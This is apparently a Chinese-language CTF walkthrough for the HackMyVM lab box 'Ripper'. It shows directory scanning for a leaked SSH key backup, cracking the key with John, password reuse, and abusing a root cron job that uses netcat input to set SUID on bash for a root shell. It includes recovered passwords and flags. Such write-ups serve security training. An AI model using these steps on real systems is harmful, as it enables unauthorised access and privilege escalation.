# Ripper

2024-11-16 https://hackmyvm.eu/machines/machine.php?vm=Ripper

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

首页无内容，对 web 进行目录扫描，http://192.168.5.40/staff_statements.txt 中得到了提示：

```
The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files.
```

提示有旧的 ssh 文件，增加扫描文件的后缀，找到 ssh 文件：

```
gobuster dir -q -t 64 -e -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,bak -u http://192.168.5.40/
```

发现 http://192.168.5.40/id_rsa.bak 得到私钥，根据前面发现的提示，用户名可能是 staff 尝试使用私钥登陆。私钥有密码，使用 John 进行破解，得到私钥的密码: bananas , 但是用户名不对，经过继续枚举，发现用户名是 jack 登陆成功。

通过 linepeas 枚举，发现 jack:Il0V3lipt0n1c3t3a 在 home 中发现了另外一个用户 helder 尝试用密码 Il0V3lipt0n1c3t3a 切换到该用户，切换成功。

得到了 user flag：

```
helder@ripper:~$cat user.txt
5c38d7d08c687355cb0ae3b6025cbe99
```

寻找提权至 root 的路径，sudo 和 suid 没有发现内容，看看有没有 cron 任务，pspy 发现每分钟执行一次：

```
/bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
```

创建 passwd.txt 文件：

```
echo Il0V3lipt0n1c3t3a > /home/helder/passwd.txt
```

然后在目标机器上创建 10000 端口的监听，触发后面的操作，将 bash 修改为 suid 程序:

```
helder@ripper:~$echo 'bash' > tmp
helder@ripper:~$nc -lvnp 10000 < tmp
```

触发成功：

```
helder@ripper:~$/usr/bin/bash -p
helder@ripper:/root$cat root.txt
e28f578a17a5f99c0381c4b689d96f9f
```
